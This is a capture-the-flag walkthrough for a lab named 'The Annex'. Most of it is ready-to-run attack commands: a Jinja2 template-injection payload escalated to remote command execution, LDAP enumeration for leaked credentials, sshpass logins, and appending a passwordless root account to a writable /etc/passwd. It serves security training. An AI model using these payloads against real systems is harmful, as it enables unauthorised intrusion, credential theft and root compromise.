# Writeup — The Annex (SPOILERS)

Flag values below are placeholders since real values are per-deployment
secrets. Replace with what your own instance gives you.

1. View-source `/` → HTML comment.
2. `curl -d "username=annex_staff&password=welcome2024" http://TARGET:8005/login` → flag 2.
3. `curl --get --data-urlencode 'name={{7*7}}' http://TARGET:8005/welcome`
   → `49` confirms SSTI. Escalate to RCE:
   ```
   curl --get --data-urlencode \
     "name={{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /opt/gateway/secret/flag3.txt').read() }}" \
     http://TARGET:8005/welcome
   ```
   → flag 3.
4. / 5. Everything from here on runs THROUGH that same RCE (swap the
   command inside `popen('...')`, same payload shape as above):
   ```
   ldapsearch -x -H ldap://directory -b dc=halcyon,dc=local
   ```
   → flag 4 (`cn=branch-note`'s description) and flag 5 + fileserver
   creds (`cn=svc-fileserver`'s description: `ops / <password>`).
6. `ssh -o StrictHostKeyChecking=no fileserver` (through the RCE; no
   login needed, the banner shows before authentication) → flag 6.
7. `sshpass -p <password> ssh -o StrictHostKeyChecking=no ops@fileserver cat flag7.txt` (through the RCE) → flag 7.
8. As `ops` (through the RCE): `ls -la /etc/passwd` shows `-rw-rw-rw-`.
   Append a root-equivalent account and use it:
   ```
   echo 'r00t::0:0:root:/root:/bin/bash' >> /etc/passwd
   su r00t -c 'cat /root/flag8.txt'
   ```
   → flag 8.
9. Same root access: `cat /root/audit.log` → flag 9, and a recovery
   passphrase for `dossier.enc` logged in cleartext.
10. Pull the encrypted file out (e.g. `su r00t -c 'cat /root/dossier.enc | base64'`
    through the RCE, then `base64 -d` locally), then:
    ```
    python3 docker/flagcrypto.py decrypt "<passphrase>" dossier.enc -
    ```
    → flag 10.

## Honeypots encountered (intentional, cost time only)
- Gateway `/admin` — a plausible path, 501, nothing behind it.
- Directory `cn=legacy-vpn` entry — a real LDAP entry, explicitly inert
  decoy credentials.
